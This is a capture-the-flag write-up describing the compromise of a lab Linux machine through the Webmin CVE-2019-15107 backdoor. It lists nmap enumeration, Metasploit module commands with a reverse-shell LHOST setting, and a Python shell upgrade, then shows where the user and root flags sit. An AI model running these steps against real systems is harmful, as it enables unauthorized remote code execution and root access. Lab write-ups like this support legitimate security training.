---
title: "Example Machine Writeup"
date: 2020-07-11
layout: "writeup"
difficulty: "Easy"
excerpt: "A comprehensive walkthrough for the 'Example' machine on a popular CTF platform."
os: "Linux"
platform: "CTF-Platform"
tags: [Exploit, Webmin, CVE-2019-15107, Remote-Code-Execution]
comments: false
---

This is an easy-rated machine based on a well-known vulnerability in a web-based administration tool. Below are the steps taken to compromise the system and escalate privileges.

### Enumeration

First, let's enumerate the target with `nmap` to identify open ports and services:
`nmap -p- -vv -T4 [target_ip]`

The scan reveals two open ports: **22 (SSH)** and **10000 (Webmin)**.

![Source nmap](/images/Source1.png)

### Initial Access

Navigating to `https://[target_ip]:10000` reveals a Webmin login page. Research indicates that Webmin versions prior to 1.930 are vulnerable to **CVE-2019-15107**, a Remote Code Execution (RCE) vulnerability in the `password_change.cgi` parameter.

We can search for an exploit module within Metasploit:
`search webmin 1.920`

![Source Metasploit](/images/Source2.png)

After selecting the appropriate module, we check the required options:
`use exploit/linux/http/webmin_backdoor`
`show options`

![Source exploit options](/images/Source3.png)

Configure the necessary parameters:
`SET RHOSTS [target_ip]`
`SET SSL true`
`SET LHOST [attacker_ip]`

Then, execute the exploit:

![Source run exploit](/images/Source4.png)

### Privilege Escalation

The exploit successfully returns a shell. Running `whoami` confirms that we have obtained high-level access immediately due to the nature of the vulnerability.

![Source root shell](/images/Source5.png)

![Source whoami](/images/Source6.png)

To make the shell more interactive, we can upgrade it using Python:
`python -c 'import pty; pty.spawn("/bin/sh")'`

Navigating to the `/home` directory reveals a local user named **standard_user**.

![Source enumerate user home](/images/Source7.png)

We can find the first flag within the user's home directory:

![Source user flag](/images/Source8.png)

Finally, we navigate to the `/root` directory to retrieve the final administrative flag.

![Source root flag](/images/Source9.png)
